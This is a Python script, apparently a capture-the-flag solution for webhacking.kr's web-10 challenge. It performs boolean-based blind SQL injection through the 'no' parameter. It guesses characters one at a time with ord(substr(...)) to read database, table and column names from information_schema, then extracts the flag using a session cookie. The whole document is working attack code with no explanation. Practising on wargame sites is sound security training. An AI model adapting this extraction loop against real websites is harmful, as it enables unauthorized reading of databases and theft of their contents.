import requests 

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
cookies = {'PHPSESSID':'Your Cookie'} 

def HttpRequest():
    # Find out (Database Name, Table Name, Column Name)
    result = ""
    for i in range(1,40): 
        check = False
        for j in range(48, 128):  # 0~9, a-z, A-Z, etc..
            url = 'https://webhacking.kr/challenge/web-10/?no=ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),{},1))in({})'.format(i,j)
            res = requests.get(url, headers=headers, cookies=cookies) 
            if '<td>1</td>' in res.text: 
                result += chr(j)
                check = True
                break 
        if check == False: 
            break 
    #print(result) 
    arr = result.split("0")
    print("Database Name: {}".format(arr[0])) 
    print("Table Name: {}".format(arr[1]))
    print("Column Name: {}".format(arr[2]))

    #Get Flag 

    result = "" 
    for i in range(1,40): 
        check = False
        for j in range(48,128): 
            url = 'https://webhacking.kr/challenge/web-10/?no=ord(substr((select(max(flag_3a55b31d))from(flag_ab733768)),{},1))in({})'.format(i,j)
            res = requests.get(url,headers=headers, cookies=cookies)
            if '<td>1</td>' in res.text:
                result += chr(j) 
                check = True
                break 
        if check == False: 
            break
    
    print("Flag: {}".format(result))

if __name__ == '__main__': 
    HttpRequest()